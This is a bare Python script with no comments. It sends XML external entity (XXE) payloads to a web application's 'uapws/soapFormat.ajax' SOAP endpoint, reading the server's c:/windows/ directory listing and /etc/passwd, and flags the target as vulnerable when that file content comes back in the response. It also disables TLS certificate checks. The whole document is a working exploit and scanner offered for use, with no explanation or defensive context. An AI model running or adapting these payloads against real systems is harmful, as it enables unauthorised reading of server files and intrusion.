import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"uapws/soapFormat.ajax"
		body='msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a'
		headers={'Content-Type': 'application/x-www-form-urlencoded'}
		response=requests.post(url,body,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and "soap:ServerADFS" in response.text and "appcompat" in response.text and "win.ini" in response.text and "explorer.exe" in response.text:
			r0=True
		else:
			r0=False
	except:
		r0=False
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"uapws/soapFormat.ajax"
		body='msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:////etc/passwd"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a'
		headers={'Content-Type': 'application/x-www-form-urlencoded'}
		response=requests.post(url,body,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and re.search("root:[^:]*:[0-9]*:[0-9]*:[^:]*",response.text):
			r1=True
		else:
			r1=False
	except:
		r1=False
	if r0 or r1:
		return True
	else:
		return False
